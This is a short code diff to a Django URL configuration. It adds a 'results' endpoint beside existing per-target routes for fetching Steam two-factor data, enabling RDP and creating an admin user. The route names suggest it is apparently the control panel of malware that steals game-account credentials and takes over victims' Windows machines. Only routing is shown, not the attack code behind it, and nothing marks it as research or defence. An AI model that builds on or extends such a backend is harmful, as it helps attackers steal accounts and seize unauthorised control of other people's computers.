@@ -35,5 +35,6 @@ urlpatterns = [
     re_path(r'^api/getSteam2fa/(?P<target_uuid>\d+)/$', views.getSteam2fa),
     re_path(r'^api/rdp_enable/(?P<target_uuid>\d+)/$', views.rdp_enable),
     re_path(r'^api/create_admin_user/(?P<target_uuid>\d+)/$', views.create_admin_user),
-    re_path(r'^api/ping/(?P<target_uuid>\d+)/$', views.ping)
+    re_path(r'^api/ping/(?P<target_uuid>\d+)/$', views.ping),
+    re_path(r'^api/results/(?P<target_uuid>\d+)/$', views.get_target_results)
 ]
